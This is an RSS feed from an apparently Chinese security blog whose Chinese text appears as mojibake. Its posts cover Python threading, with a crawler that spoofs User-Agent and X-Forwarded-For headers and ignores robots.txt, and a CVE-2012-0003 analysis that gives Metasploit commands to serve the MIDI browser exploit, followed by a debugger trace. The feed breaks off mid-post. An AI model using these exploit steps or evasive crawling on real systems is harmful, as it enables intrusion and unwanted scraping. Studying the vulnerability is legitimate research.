<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 02 Sep 2016 17:54:19 +0800</pubDate>
    <lastBuildDate>Fri, 02 Sep 2016 17:54:19 +0800</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>pythonå¤šè¿›ç¨‹å¤šçº¿ç¨‹</title>
        <description>&lt;h3 id=&quot;x01-python&quot;&gt;0x01 ä¸ºä»€ä¹ˆæœ‰äººè¯´Pythonçš„å¤šçº¿ç¨‹æ˜¯é¸¡è‚‹&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;å·®ä¸å¤šæ˜¯è¿™æ ·å­.å¤šçº¿ç¨‹ç›®å‰ä»…ç”¨äºç½‘ç»œå¤šçº¿ç¨‹é‡‡é›†, ä»¥åŠæ€§èƒ½æµ‹è¯•.
å…¶å®ƒçš„è¯­è¨€ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µ,çº¿ç¨‹æœ¬èº«çš„ç‰¹ç‚¹å¯¼è‡´çº¿ç¨‹çš„é€‚ç”¨èŒƒå›´æ˜¯å—é™çš„.åªæœ‰CPUè¿‡å‰©,è€Œå…¶å®ƒçš„ä»»åŠ¡å¾ˆæ…¢,æ­¤æ—¶ç”¨çº¿ç¨‹æ‰æ˜¯æœ‰
ç›Šçš„,å¯ä»¥å¾ˆå¥½å¹³è¡¡ç­‰å¾…æ—¶é—´,æé«˜å¹¶å‘æ€§èƒ½.çº¿ç¨‹çš„é—®é¢˜ä¸»è¦æ˜¯çº¿ç¨‹çš„å®‰å…¨ç¨³å®šæ€§.çº¿ç¨‹æ— æ³•å¼ºåˆ¶ä¸­æ­¢,åŒæ—¶çº¿ç¨‹ä¸ä¸»è¿›ç¨‹å…±äº«å†…
å­˜,å¯èƒ½ä¼šå½±å“ä¸»è¿›ç¨‹çš„å†…å­˜ç®¡ç†.åœ¨pythoné‡Œçº¿ç¨‹å‡ºé—®é¢˜,å¯èƒ½ä¼šå¯¼è‡´ä¸»è¿›ç¨‹å´©æºƒ. è™½ç„¶pythoné‡Œçš„çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿçš„çœŸå®çº¿ç¨‹
é‚£ä¹ˆæ€ä¹ˆè§£å†³å‘¢?é€šè¿‡æˆ‘ä»¬ç”¨è¿›ç¨‹æ–¹å¼.å­è¿›ç¨‹å´©æºƒå,ä¼šå®Œå…¨çš„é‡Šæ”¾æ‰€æœ‰çš„å†…å­˜å’Œé”™è¯¯çŠ¶æ€.æ‰€ä»¥è¿›ç¨‹æ›´å®‰å…¨. å¦å¤–é€šè¿‡è¿›ç¨‹,
pythonå¯ä»¥å¾ˆå¥½çš„ç»•è¿‡GIL,è¿™ä¸ªå…¨å±€é”é—®é¢˜. ä½†æ˜¯è¿›ç¨‹ä¹Ÿæ˜¯æœ‰å±€é™çš„.ä¸è¦å»ºç«‹è¶…è¿‡CPUæ€»æ ¸æ•°çš„è¿›ç¨‹,å¦åˆ™æ•ˆç‡ä¹Ÿä¸é«˜.

ç®€å•çš„æ€»ç»“ä¸€ä¸‹.
å½“æˆ‘ä»¬æƒ³å®ç°å¤šä»»åŠ¡å¤„ç†æ—¶,é¦–å…ˆè¦æƒ³åˆ°ä½¿ç”¨multiprocessing, ä½†æ˜¯å¦‚æœè§‰ç€è¿›ç¨‹å¤ªç¬¨é‡,é‚£ä¹ˆå°±è¦è€ƒè™‘ä½¿ç”¨çº¿ç¨‹. å¦‚æœå¤šä»»åŠ¡
å¤„ç†ä¸­éœ€è¦å¤„ç†çš„å¤ªå¤šäº†,å¯ä»¥è€ƒè™‘å¤šè¿›ç¨‹,æ¯ä¸ªè¿›ç¨‹å†é‡‡ç”¨å¤šçº¿ç¨‹.å¦‚æœè¿˜å¤„ç†ä¸è¦,å°±è¦ä½¿ç”¨è½®è¯¢æ¨¡å¼,æ¯”å¦‚ä½¿ç”¨poll event,
twistedç­‰æ–¹å¼.å¦‚æœæ˜¯GUIæ–¹å¼,åˆ™è¦é€šè¿‡äº‹ä»¶æœºåˆ¶,æˆ–è€…æ˜¯æ¶ˆæ¯æœºåˆ¶å¤„ç†,GUIä½¿ç”¨å•çº¿ç¨‹.æ‰€ä»¥åœ¨pythoné‡Œçº¿ç¨‹ä¸è¦ç›²ç›®ç”¨, ä¹Ÿ
ä¸è¦æ»¥ç”¨. ä½†æ˜¯çº¿ç¨‹ä¸å®‰å…¨æ˜¯äº‹å®.å¦‚æœä»…ä»…æ˜¯åšå‡ ä¸ªåå°ä»»åŠ¡,åˆ™å¯ä»¥è€ƒè™‘ä½¿ç”¨å®ˆæŠ¤çº¿ç¨‹åš.å¦‚æœéœ€è¦åšä¸€äº›å±é™©æ“ä½œ,å¯èƒ½ä¼š
å´©æºƒçš„,å°±ç”¨å­è¿›ç¨‹å»åš. å¦‚æœéœ€è¦é«˜åº¦ç¨³å®šæ€§,åŒæ—¶å¹¶å‘æ•°åˆä¸é«˜çš„æœåŠ¡.åˆ™å¼ºçƒˆå»ºè®®ç”¨å¤šè¿›ç¨‹çš„multiprocessingæ¨¡å—å®ç°.
åœ¨linuxæˆ–è€…æ˜¯unixé‡Œ,è¿›ç¨‹çš„ä½¿ç”¨ä»£ä»·æ²¡æœ‰windowsé«˜.è¿˜æ˜¯å¯ä»¥æ¥å—çš„.

                                                            --refer from baidu zhidao
more:
    https://www.zhihu.com/question/23474039
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 ç»å…¸å¤šçº¿ç¨‹å­¦ä¹ ç†è§£&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://blog.csdn.net/a921800467b/article/details/8579915
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-io--&quot;&gt;0x03 ç½‘ç»œio é˜»å¡|éé˜»å¡ åŒæ­¥|å¼‚æ­¥&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.cnblogs.com/Anker/p/3254269.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 å®ä¾‹&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;good
    http://www.2cto.com/kf/201504/395330.html 
    https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html

http://www.cnblogs.com/zhangchaoyang/articles/5188904.html çº¿ç¨‹æ± å®ç°
https://superxiaoxiong.github.io/2016/08/25/python-threadpool/
http://www.jb51.net/article/79631.htm
http://www.jb51.net/article/71911.htm
http://www.cnblogs.com/fnng/p/3670789.html
http://5ydycm.blog.51cto.com/115934/1435042
http://www.codexiu.cn/python/blog/939/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-attention&quot;&gt;0x04 attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;threadpool

    threadpoolçº¿ç¨‹æ± æ¨¡å—å·²ç»è¿‡æ—¶,å®˜æ–¹å¦‚ä¸‹è¯´æ˜,å»ºè®®ä½¿ç”¨multiprocessingæ¨¡å—ç”šè‡³æ˜¯ç”¨asyncioè¿™ä¸ªæ¨¡å—æ¥é€šè¿‡å¼‚æ­¥å®ç°

    This module is OBSOLETE and is only provided on PyPI to support old projects that still use it. Please DO
    NOT USE IT FOR NEW PROJECTS! Use modern alternatives like the multiprocessing module in the standard
    library or even an asynchroneous approach with asyncio

    multiprocessingå¤šè¿›ç¨‹å¤šçº¿ç¨‹æ¨¡å—
    https://docs.python.org/2.7/library/multiprocessing.html(pyå®˜æ–¹doc)

    asyncioå¼‚æ­¥ioæ¨¡å—(pyhton3.4æ–°å¢æ¨¡å—,py2æ²¡æœ‰)
    https://docs.python.org/3/library/asyncio.html#module-asyncio

2&amp;gt;join()å’ŒsetDaemonçš„åŒºåˆ«

    http://blog.csdn.net/zhangzheng0413/article/details/41728869
    åŠŸèƒ½åŸºæœ¬æ˜¯ç›¸åçš„
        thread.joinæ˜¯è¦æ±‚æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œ,ä¸»çº¿ç¨‹æ‰ä¸é˜»å¡

        thread.setDaemon(True)æ˜¯å°†çˆ¶çº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹,ä¹Ÿå³ä¸»çº¿ç¨‹æ‰§è¡Œå®Œåä¸ç®¡å­çº¿ç¨‹æœ‰æ²¡æœ‰æ‰§è¡Œå®Œ,å­çº¿ç¨‹ç›´æ¥ç»“æŸ,
        setDaemonè¦è®¾ç½®åœ¨thread.start()ä¹‹å‰

3&amp;gt;pool.apply()å’Œpool.map

eg.
from multiprocessing.dummy import Pool as ThreadPool
pool=ThreadPool(20)

forå¾ªç¯ä¸‹çš„pool.apply()ç›¸å½“äºpool.map

pool.apply()å’Œpool.apply_async()çš„åŒºåˆ«æ˜¯:apply_asyncæ˜¯å¹¶è¡Œå¤„ç†,applyä¸æ˜¯,å¿…é¡»ç­‰æ¯ä¸ªå­çº¿ç¨‹æ‰§è¡Œå®Œ
    apply
    It blocks until the result is ready, so apply_async() is better suited for performing work in parallel.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-important&quot;&gt;0x05 important&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;multiprocessingæ¨¡å—æ˜¯é‡ç‚¹

multiprocessing poolæºç è§£è¯»
http://www.bingtel.wang/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%BC%96%E7%A8%8B%E4%B9%8Bmultiprocessing-pool%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB.html

https://docs.python.org/2.7/library/multiprocessing.html(pyå®˜æ–¹è‹±æ–‡doc)
http://python.usyiyi.cn/translate/python_278/library/index.html(ä¸­æ–‡doc)
http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map

ä¸­æ–‡ä¸è¯¦å°½,è‹±æ–‡ä¸­è¯´åˆ°multiprocessing.dummyå°±æ˜¯multiprocessingçš„å¤åˆ¶ç‰ˆæœ¬,åªä¸è¿‡multiprocessing.dummyä½œç”¨äºçº¿ç¨‹
&quot;multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around the threading module.&quot;
æ‰€ä»¥å‚è€ƒmultiprocessingçš„apiæ¥ä½¿ç”¨æ“ä½œçº¿ç¨‹æ± å³å¯

pool.close()
    é˜²æ­¢ä»»ä½•æ›´å¤šçš„ä»»åŠ¡(å…¶ä»–æ²¡æœ‰å®‰æ’è¿‡çš„ä»»åŠ¡,mapè¿‡çš„ä»»åŠ¡ä¸å±äºè¿™ä¸ªèŒƒå›´)è¢«æäº¤åˆ°çº¿ç¨‹æ± ä¸­.ä¸€æ—¦æ‰€æœ‰çš„ä»»åŠ¡å·²ç»å®Œæˆäº†å·¥ä½œçº¿ç¨‹å°†é€€å‡º.

pool.terminate()
    ç«‹å³åœæ­¢çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹(æ— è®ºä»»åŠ¡æœ‰æ²¡æœ‰å®Œæˆ),ç»æµ‹è¯•å¹¶ä¸èƒ½åœæ­¢æ‰€æœ‰çš„çº¿ç¨‹æ± ä¸­è¦è¿›è¡Œçš„ä»»åŠ¡,åº”è¯¥
    æ˜¯åªèƒ½åœæ­¢å½“å‰æ­£åœ¨æ‰§è¡Œçš„ä¸€ä¸ªå‡½æ•°è¿‡ç¨‹(å­çº¿ç¨‹)

    ä¸ºäº†åœæ­¢çº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰çº¿ç¨‹,å°¤å…¶æ˜¯åœ¨çˆ†ç ´å¯†ç æ—¶,æŸä¸€ä¸ªçº¿ç¨‹å·²ç»çˆ†ç ´æˆåŠŸ,ä¸ºäº†è¾¾åˆ°&quot;åœæ­¢å…¶ä»–çš„å°†è¦æ‰§
    è¡Œçš„é€šè¿‡mapåŠ å…¥åˆ°poolçº¿ç¨‹æ± ä¸­çš„ä»»åŠ¡&quot;ç›¸åŒçš„æ•ˆæœ,åœ¨æ¯ä¸ªçº¿ç¨‹ä¸­çš„å¼€å¤´åˆ¤æ–­æ˜¯å¦å·²ç»çˆ†ç ´æˆåŠŸ,æˆåŠŸåˆ™ç›´
    æ¥return,ä¸æˆåŠŸåˆ™ç»§ç»­æœ¬çº¿ç¨‹åº”è¯¥å®Œæˆçš„å·¥ä½œ

pool.join()
    ç­‰å¾…çº¿ç¨‹æ± ä¸­çš„å·¥ä½œçº¿ç¨‹é€€å‡º,å¿…é¡»å…ˆä½¿ç”¨pool.close()æˆ–è€…pool.terminate()æ‰èƒ½è°ƒç”¨join()


concurrent.futures(python3.2æ–°å¢æ¨¡å—)

    https://docs.python.org/3/library/concurrent.futures.html
    ThreadPoolExecutorçº¿ç¨‹æ± 
    ProcessPoolExecutorè¿›ç¨‹æ± 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x06-my-easycrawl-code&quot;&gt;0x06 my easy_crawl code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def get_random_ua():
    #å¾—åˆ°éšæœºuser-agentå€¼
    f=open(&quot;dicts/user-agents.txt&quot;,&quot;r+&quot;)
    all_user_agents=f.readlines()
    f.close()
    random_ua_index=random.randint(0,len(all_user_agents)-1)
    ua=re.sub(r&quot;(\s)$&quot;,&quot;&quot;,all_user_agents[random_ua_index])
    return ua

def get_random_x_forwarded_for():
    #å¾—åˆ°éšæœºx-forwarded-forå€¼
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(xrange(1, 255), 4)
    return &#39;.&#39;.join(str(_) for _ in numbers)


def get_request(uri):
    #å‘å‡ºgetè¯·æ±‚,è¿”å›å€¼ä¸ºä¸€ä¸ªå­—å…¸,æœ‰ä¸‰ä¸ªé”®å€¼å¯¹:eg.{&quot;code&quot;:200,&quot;title&quot;:None,&quot;content&quot;:&quot;&quot;}
    #codeæ˜¯intç±»å‹
    #titleå¦‚æœæ²¡æœ‰åˆ™è¿”å›None,æœ‰åˆ™è¿”å›strç±»å‹
    #contentå¦‚æœæ²¡æœ‰åˆ™è¿”å›&quot;&quot;
    try:
        import mechanize
    except:
        os.system(&quot;pip install mechanize&quot;)
        import mechanize
    try:
        import cookielib
    except:
        os.system(&quot;pip install cookielib&quot;)
        import cookielib
    try:
        br = mechanize.Browser()
        br.set_cookiejar(cookielib.LWPCookieJar()) # Cookie jar
        br.set_handle_equiv(True) # Browser Option
        br.set_handle_gzip(False)# use to be True
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        ua=get_random_ua()
        x_forwarded_for=get_random_x_forwarded_for()
        br.addheaders = [(&#39;User-agent&#39;, &#39;%s&#39; % ua),(&#39;X-Forwarded-For&#39;,&#39;%s&#39; % x_forwarded_for)]
        br.open(uri)
        br._factory.is_html = True
        code=br.response().code
        title=br.title()
        content=br.response().read()
    except mechanize.HTTPError as e:
        code=e.code
        content=e.read()
        soup=BeautifulSoup(content,&quot;lxml&quot;)
        title=soup.title.string
    return_value={&#39;code&#39;:code,&#39;title&#39;:title,&#39;content&#39;:content}
    #print return_value
    return return_value


def collect_uris_from_uri(uri):
#ä»uriæ‰€åœ¨çš„htmlå†…å®¹ä¸­æ”¶é›†uriåˆ°urié˜Ÿåˆ—
#è¿”å›å€¼æ˜¯ä¸€ä¸ªå­—å…¸,{&#39;y1&#39;:y1,&#39;y2&#39;:y2}
#y1æ˜¯æ ¹æ®å‚æ•°uriå¾—åˆ°çš„htmlé¡µé¢ä¸­çš„æ‰€æœ‰uri,æ˜¯ä¸ªåˆ—è¡¨ç±»å‹
#y2æ˜¯å‚æ•°uriå¯¹åº”çš„ä¸‰ä¸ªå…³é”®å…ƒç´ ,y2æ˜¯ä¸ªå­—å…¸ç±»å‹,eg.{&quot;code&quot;:200,&quot;title&quot;:None,&quot;content&quot;:&quot;&quot;}
    all_uris=[]
    result=get_request(uri)
    content=result[&#39;content&#39;]
    bs=BeautifulSoup(content,&quot;lxml&quot;)
    for each in bs.find_all(&#39;a&#39;):
        find_uri=each.get(&#39;href&#39;)
        all_uris.append(find_uri)
    return {&#39;y1&#39;:all_uris,&#39;y2&#39;:result}


class MyThread(threading.Thread):
    def __init__(self,func,args,name=&#39;&#39;):
        threading.Thread.__init__(self)
        self.name=name
        self.func=func
        self.args=args
    def run(self):
        self.result=apply(self.func,self.args)
    def get_result():
        return self.result

def crawl_uri(uri):
    #çˆ¬è™«,å¯è·å–uriå¯¹åº”ç½‘ç«™çš„æ‰€æœ‰å¯æŠ“å–çš„uriå’Œæ‰€æœ‰ç½‘é¡µä¸‰å…ƒç´ :code,title,content
    uris_queue=Queue.Queue()
    uris_uri_keyvalues={}
    #uriå’Œuriçš„ä¸‰ä¸ªå…ƒç´ çš„å¯¹åº”å€¼ä¸ºä¸€ä¸ªå­—å…¸çš„é”®å€¼å¯¹
    #eg{&#39;http://www.baiud.com&#39;:{&#39;code&#39;:code,&#39;title&#39;:title,&#39;content&#39;:content},&quot;&quot;:{},&quot;&quot;:{},...}
    #ç”¨äºæ”¶é›†uriä¸å¯¹åº”çš„ä¸‰ä¸ªå…ƒç´ çš„å€¼,æ”¶é›†åè€ƒè™‘å¯èƒ½ç»Ÿä¸€å­˜å…¥æ•°æ®åº“

    #æ”¶é›†ç›¸åŒåŸŸåç½‘ç«™å†…çš„uris
    domain_uris=[]
    #æ”¶é›†äºŒçº§åŸŸå
    subdomain_uris=[]
    def task_finish_func():
        while True:
            current_uri=uris_queue.get()
            http_domain=get_http_domain_from_uri(current_uri)
            #eg.main_domain_prefixä»http://www.freebuf.comä¸­å¾—åˆ°www
            #main_domain_key_valueä»http://www.freebuf.comä¸­å¾—åˆ°freebuf
            main_domain_prefix=re.search(r&quot;http(s)?://([^\.]*)\.([^\./]*)&quot;,current_uri).group(2)
            main_domain_key_value=re.search(r&quot;http(s)?://([^\.]*)\.([^\./]*)&quot;,current_uri).group(3)
            #print main_domain_prefix
            #print main_domain_key_value
            #raw_input()
            result=collect_uris_from_uri(current_uri)
            uris=result[&#39;y1&#39;]
            for each in uris:
                #collect_uris_from_uriå¾—åˆ°çš„ç»“æœä¸­çš„å…ƒç´ å¯èƒ½æ˜¯None
                if each is not None:
                    tmp=get_http_domain_pattern_from_uri(http_domain)
                    http_domain_pattern=re.compile(r&quot;%s&quot; % tmp)
                    if re.match(http_domain_pattern,each):
                        each=re.sub(r&quot;/$&quot;,&quot;&quot;,each)
                        if each not in domain_uris:
                            print each
                            domain_uris.append(each)
                            #print domain_uris
                            uris_queue.put(each)
                    sub_pattern=re.compile(r&quot;http(s)?://[^\.]*(?&amp;lt;!%s)\.%s&quot; % (main_domain_prefix,main_domain_key_value))
                    if re.match(sub_pattern,each):
                        each_subdomain=get_http_domain_from_uri(each)
                        if each_subdomain not in subdomain_uris:
                            #äºŒçº§åŸŸååªå°†http_domainéƒ¨åˆ†åŠ å…¥æ”¶è—,ä¸æ”¾åˆ°é˜Ÿåˆ—é‡Œ
                            print each_subdomain
                            subdomain_uris.append(each_subdomain)
            uris_uri_keyvalues[&#39;%s&#39; % uri]=result
            uris_queue.task_done()


    #åˆå§‹åŒ–
    uri=re.sub(r&quot;(/{0,2}(\s){0,2})$&quot;,&quot;&quot;,uri)
    start_uris=[uri]
    http_domain=get_http_domain_from_uri(uri)
    if uri!=http_domain:
        start_uris.append(http_domain)
    for each in start_uris:
        uris_queue.put(each)

    &#39;&#39;&#39;ä¼ ç»Ÿå¤šçº¿ç¨‹
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print &quot;%s threads started&quot; % str(i)
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #upon threads=200 ===&amp;gt; 38,16
    #threads=5 ===&amp;gt; 12,16
    #threads=10 4,16
    #threads=15 3.4,16
    &#39;&#39;&#39;

    &#39;&#39;&#39;å•çº¿ç¨‹
    start=time.time()
    task_finish_func()
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #thread=1 task_finish_funcä¸­while Trueæ”¹æˆwhile uris_queue.empty() is False,è¦ä¸ç„¶ä¸ä¼šæ‰§è¡Œåˆ°æœ€å    19.4,16
    &#39;&#39;&#39;

    mythreads=[]
    start=time.time()
    pool=ThreadPool(15)
    for i in range(15):
        #è¿™é‡Œæ¯”è¾ƒç‰¹æ®Š,å› ä¸ºå‡½æ•°task_finish_funcæ˜¯ä¸ªæ— é™å¾ªç¯çš„å‡½æ•°,æ‰€ä»¥å°±ç®—è¿™é‡Œå¼€20ä¸ªçº¿ç¨‹ä¹Ÿä¼šå› ä¸ºçº¿ç¨‹æ± ä¸­åªæœ‰15ä¸ª
        #ä½ç½®ä½¿å¾—ä¸€ç›´åªæœ‰15ä¸ªçº¿ç¨‹åœ¨è¿è¡Œ,å¤šä½™çš„5ä¸ªçº¿ç¨‹ç›¸å½“äºæ²¡æœ‰è®¾ç½®ä¸€æ ·
        pool.apply_async(task_finish_func,())
    pool.close()

    while 1:
        #è¿™é‡Œçš„ifå–ä»£ä¸‹é¢çš„uris_queue.join(),æœ‰æ—¶çˆ¬è™«è¢«banæ—¶,å¦‚æœç”¨uris_queue.join()ä¼šæ— é™ç­‰å¾…
        num_of_result=len(domain_uris)
        sleep(15)
        if len(domain_uris)==num_of_result:
            print &quot;finished,if the number of uris you get is not big enough,you may be banned to crawl :(&quot;
            break

    #uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #threads=15(pool_size=15,for_range=20) 4.15,16
    #threads=20(pool_size=20,for_range=20) 9.2,16
    #threads=10(pool_size=10,for_range=20) 4.2,16

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 30 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/30/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/</link>
        <guid isPermaLink="true">/python/2016/08/30/python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/</guid>
        
        <category>python</category>
        
        <category>coding</category>
        
        <category>effective</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>pythonä»£ç æ•ˆç‡</title>
        <description>&lt;h3 id=&quot;x00-&quot;&gt;0x00 ä¸¤ç§è¯»æ–‡ä»¶çš„ä¸åŒæ•ˆç‡&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#ç¬¬ä¸€ç§:f=open(),for each in f
import time
start=time.clock()
count=0
f=open(&quot;webshell_passwords.txt&quot;,&quot;r+&quot;)
for each in f:
    count+=1
end=time.clock()
print end-start
f.close()

#ç¬¬äºŒç§:f=open(),all=f.readlines(),for each in all
start1=time.clock()
count1=0
f=open(&quot;webshell_passwords1.txt&quot;,&quot;r+&quot;)
all=f.readlines()
for each in all:
    count1+=1
end1=time.clock()
print end1-start1
f.close()

&#39;&#39;&#39;
è¾“å‡º:
0.001017
0.001255

ç»“è®º:
f.readlines()æ˜¯å¤šä½™çš„è¿ä½œ,è¿™æ ·æµªè´¹ç³»ç»Ÿèµ„æº
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 26 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/26/python%E4%BB%A3%E7%A0%81%E6%95%88%E7%8E%87/</link>
        <guid isPermaLink="true">/python/2016/08/26/python%E4%BB%A3%E7%A0%81%E6%95%88%E7%8E%87/</guid>
        
        <category>coding</category>
        
        <category>efficient</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2012-0003</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;è¿™ä¸ªæ¼æ´æ˜¯ç”±äºå¾®è½¯çš„å¤šåª’ä½“åº“winmm.dll(c:\windows\system32\winmm.dll)åœ¨å¤„ç†MIDIæ–‡ä»¶æ—¶,ç”±äºå¯¹æ•°æ®çš„å¤„ç†ä¸å½“å¯¼è‡´çš„å †æº¢å‡º,æ”»å‡»è€…å¯ä»¥åœ¨ç½‘é¡µä¸­åµŒå…¥ç‰¹
æ®Šçš„MIDIæ–‡ä»¶æ¥è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 å‡†å¤‡å·¥ä½œ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;ä½¿ç”¨msfä¸­çš„exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.3.165:8080/test.html
    å¥‡æ€ªçš„æ˜¯åœ¨ç³»ç»Ÿä¸­ä¸å­˜åœ¨test.html,ä½†æ˜¯è®¿é—®ä¸Šé¢ç”Ÿæˆçš„ç½‘é©¬é“¾æ¥ç¡®å®ä¼šä¸­é©¬,åæ¥æŸ¥çœ‹msfä¸­çš„exp:ms12_004_midi.rb,é‡Œ
    é¢ç”Ÿæˆhtmlçš„ä»£ç ä¸º
        send_response(cli, html, {&#39;Content-Type&#39;=&amp;gt;&#39;text/html&#39;})
    send_responseå‡½æ•°åœ¨msfapiä¸­æœ‰å¦‚ä¸‹ç”¨æ³•
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method&quot;&gt;msfapi_send_response&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä¹Ÿå³ç›¸å½“äºmsfå†…ç½®webserveré€šè¿‡send_responseå‡½æ•°å‘é€htmlä»£ç åˆ°å®¢æˆ·ç«¯å®ç°ä¸‹é¢è¿™ä¸ªé“¾æ¥çš„è®¿é—®
        http://192.168.3.165:8080/test.html
    è¿™ç§æ–¹å¼æ¯”è¾ƒå¥‡ç‰¹,å¤§æ¦‚æ˜¯ä»è¾ƒåº•å±‚æ¥å®ç°çš„

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01--1&quot;&gt;0x01 è°ƒè¯•åˆ†æ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ‰“å¼€iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    è¿™é‡Œå¦‚æœåœ¨windbgä¸­è®¾ç½®!gflag +hpaä¸ä¼šæˆåŠŸ,å¯èƒ½æ˜¯winxpæˆ–æ˜¯windbgçš„é—®é¢˜
windbg:f6é™„åŠ iexplore.exe
!gflag
    0:016&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ieæ‰“å¼€http://192.168.3.165:8080/test.html
    (7ac.208): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=15467019 edi=15464f60
    eip=76b2d224 esp=34c6fe80 ebp=34c6fea0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    WINMM!midiOutPlayNextPolyEvent+0x1ec:
    76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:15467019=??

    åˆ°è¿™é‡ŒåªçŸ¥é“76b2d224å¤„æœ‰å†…å­˜è®¿é—®å¼‚å¸¸,ç„¶è€Œè¦æƒ³å†™å‡ºexp,è¿˜éœ€è¦å¼„æ¸…å‚æ•°ä¼ é€’è¿‡ç¨‹,è¿™ä¸ª&quot;å †æº¢å‡º&quot;cveçš„åˆ©ç”¨ä¸æ˜¯
